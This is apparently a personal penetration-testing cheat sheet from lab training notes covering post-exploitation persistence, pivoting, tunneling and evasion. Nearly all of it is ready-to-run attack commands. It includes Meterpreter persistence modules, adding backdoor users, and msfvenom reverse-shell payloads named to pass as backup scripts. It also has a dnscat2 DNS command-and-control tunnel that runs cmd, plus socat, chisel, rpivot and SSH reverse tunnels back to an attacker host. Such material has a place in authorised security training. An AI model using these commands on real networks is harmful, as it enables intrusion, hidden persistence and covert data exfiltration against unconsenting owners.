
## Persistence
*Probably already with a meterpreter shell*

**Scripts**
```
run persistance -h
exploit/windows/local/persistance
exploit/windows/local/registry_persistance
```
**Scheduled Task**
```
run scheduleme
run scheduletaskabuse
```
**Add User**
```
net user <user> <pass> /add
```
**MSFVenom**
```
msfvenom -a <arch> --platform <os> -x <name>.<ext> -k -p windows/messagebox lhost=<ip> -b "\x00" -f exe -o <final_name>.<ext>
```
## Pivoting
*Utilizing multiple hosts to cross network boundaries you would not usually have access to. This is more of a targeted objective.*


SSH proxy through a compromised machine
```
ssh  -f -N -D <Proxy Port> -i pivot <root user>@<proxy ip> 
```
Then run "proxychains" before commands you want to proxy like
```
proxychains nmap -sV <target ip>
```
Other tools that can be used are [sshuttle](https://github.com/sshuttle/sshuttle?tab=readme-ov-file) and [chisel](https://github.com/jpillora/chisel)
```
sshuttle -r <root>@<proxy ip> <new network>/<CIDR> --ssh-cmd "ssh -i proxy"
```
SSH Tunnel
```
ssh -L 1234:localhost:3306 Ubuntu@<IPaddressofTarget>
```

Use Bloodhound and tools like [draw.io](https://draw.io/)

Port Forwarding
Protocols
- SOCKS
- SSH
- 
## Lateral Movement
*Used to further our access to additional hosts, applications, and services within a network environment*
Check routing 
```
netstat -r
```
```
ip route
```
*Genmask (generality mask): The netmask for the destination net*

## Tunneling
*These types of actions also enable tactics like the exfiltration of data out of a target network or the delivery of more payloads and instructions into the network.*
Network Interfaces

| Int Name | Use                                |
| -------- | ---------------------------------- |
| eth      | Classic, unpredictable             |
| eno      | Firmware/BIOS indexed              |
| ens      | Firmware/BIOS indexed PCIE Hotplug |
| enXs     | Physical location of connector     |
| enx      | Name incorporating a MAC address   |

### Dynamic Port Forwarding with SSH and SOCKS Tunneling
![[../Pasted image 20250604155036.png]]


Local port forward
```
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```
Multiple Local Port Forward
```
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```
Dynamic Port Forwarding with SSH and SOCKS Tunneling
```
ssh -D 9050 ubuntu@10.129.202.64
```
(use 9050 or whatever port is in your `/etc/proxychains.conf` file as the main port)

### Remote/Reverse Port Forwarding with SSH
*Instead of forwarding a port to access a service we forward a service to a port*

Making an MSFVenom payload to forward traffic to our pivot
```
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```
This would go from port 8080 on the new target to 8000 of the pivot. Use the exploit/multi/handler to connect a listener. 

SSH reverse port forward 
```
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```
If you want to receive a data from all IP addresses on a local machine use the IP 0.0.0.0
### Meterpreter Tunneling & Port Forwarding
Manual ping sweeps in shells
```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```
```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```
```cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```
To set one up run 
```
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.
[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options
Module options (auxiliary/server/socks_proxy):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  9050             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
                                        5)
Auxiliary action:
   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server
```
Then confirm it by running `jobs` in `msfconsole`

To make an autoroute in `msfconsole` run
```
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```
Or in `Meterpreter`
```
run autoroute -s 172.16.5.0/23
```
Then list active routes with
```
run autoroute -p
```
MSFVenom payload to pivot
```shell-session
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```
### SOCAT
*This is just a bidirectional relay tool for piping data between 2 network channels*
```
socat TCP4-LISTEN:8080,fork TCP4:<attack host>:80
```
*This tool is cool because it without using SSH*
You can use this to do bind and reverse shell redirects

### Evasion
**Plink** (part of the PuTTY package) can be used to LotL and avoid having to download tools. 
Use Plink basically like this 
```
plink -ssh -D 9050 ubuntu@10.129.15.50
```
Sshuttle is an SSH Proxy
```
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
```
Nmap
```
nmap -v -sV -p3389 172.16.5.19 -A -Pn
```
**Rpivot**
Running the server
```
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```
Transfer Rpivot to target 
```
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```
Running on client
```
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```
Browsing to a webserver
```
proxychains firefox-esr 172.16.5.135:80
```
Connecting to a webserver with HTTP-Proxy and NTLM
```
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```
**Netsh.exe**
```cmd
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25
```
Verify it worked
```cmd
netsh.exe interface portproxy show v4tov4
```
**Dnscat2**
*It's just a C2 over encrypted DNS*
Install
```
git clone https://github.com/iagox86/dnscat2.git
```
Server Start
```
```
 sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```
```
If you want PowerShell use `dnscat2-powershell`
Install 
```
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```
Importing it
```powershell
Import-Module .\dnscat2.ps1
```
Setting up a tunnel
```powershell
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```
*You must use pre-shared secret*

**FreeRDP**
```
xfreerdp /v:<rdp-server> /u:<user> /p:<pass>
```

**Chisel**
*SOCKS5 Proxy*
Install
```
git clone https://github.com/jpillora/chisel.git
cd chisel
go build
```
Transfer bin to another host 
```
scp chisel <user>@<target-ip>:~/
```
Running on a pivot host
```
./chisel server -v -p 1234 --socks5
```
Running on the pivot
```
./chisel client -v <pivot-host>:1234 socks
```
Reverse Proxy
```
sudo ./chisel server --reverse -v -p 1234 --socks5
```
```
./chisel client -v 10.10.14.17:1234 R:socks
```
